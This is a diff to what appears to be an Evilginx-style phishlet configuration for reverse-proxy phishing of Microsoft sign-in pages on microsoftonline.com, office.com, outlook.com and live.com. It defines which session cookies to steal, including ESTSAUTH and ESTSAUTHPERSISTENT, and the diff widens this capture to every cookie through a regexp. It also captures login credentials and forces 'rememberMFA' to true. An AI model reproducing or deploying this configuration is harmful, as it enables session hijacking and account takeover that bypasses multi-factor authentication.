@@ -5,8 +5,8 @@ proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
   - {phish_sub: 'device.login', orig_sub: 'device.login', domain: 'microsoftonline.com', session: true, is_landing:true}
-  - {phish_sub: 'outlook', orig_sub: 'www', domain: 'outlook.com', session: true, is_landing:true}
-  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing:true}
+  - {phish_sub: 'outlook', orig_sub: 'www', domain: 'outlook.com', session: true, is_landing:false}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing:false}
 
 sub_filters:
 auth_tokens:
@@ -15,9 +15,9 @@ auth_tokens:
   - domain: 'login.microsoftonline.com'
     keys: ['ESTSAUTHLIGHT']   
   - domain: '.outlook.com'
-    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT','SignInStateCookie',]
+    keys: ['.*,regexp']
   - domain: 'login.live.com'
-    keys: ['ESTSAUTHLIGHT'] 
+    keys: ['.*,regexp'] 
 credentials:
   username:
     key: 'login'
@@ -44,3 +44,4 @@ force_post:
       - {key: 'rememberMFA', value: 'true'}
 
     type: 'post'
+
